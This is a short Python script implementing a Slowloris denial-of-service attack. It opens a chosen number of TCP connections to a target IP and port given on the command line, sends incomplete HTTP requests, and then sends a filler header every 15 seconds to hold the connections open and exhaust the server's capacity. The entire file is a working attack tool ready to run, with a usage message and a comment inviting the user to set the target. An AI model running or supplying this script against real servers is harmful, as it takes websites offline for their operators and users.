import socket
import time
import sys


def slowloris(target_ip, target_port, connection_count):
    headers = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept-language: en-US,en,q=0.5"
    ]

    socket_list = []

    # Establishing the connections
    for _ in range(connection_count):
        try:
            print(f"Creating connection {_ + 1}/{connection_count}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode('ascii'))
            for header in headers:
                s.send(f"{header}\r\n".encode('ascii'))
            socket_list.append(s)
        except Exception as e:
            print(f"Error creating connection: {e}")
            break

    # Keeping the connections open
    while True:
        try:
            print(f"Keeping {len(socket_list)} connections open")
            for s in list(socket_list):
                try:
                    s.send(b"X-a: b\r\n")
                    time.sleep(15)  # Send keep-alive headers every 15 seconds
                except socket.error:
                    socket_list.remove(s)
        except KeyboardInterrupt:
            print("Stopping Slowloris")
            break

        if len(socket_list) == 0:
            print("All connections closed, exiting")
            break


# Change the IP, port, and number of connections accordingly
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 slowloris.py <target_ip> <target_port> <connection_count>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    connection_count = int(sys.argv[3])

    slowloris(target_ip, target_port, connection_count)
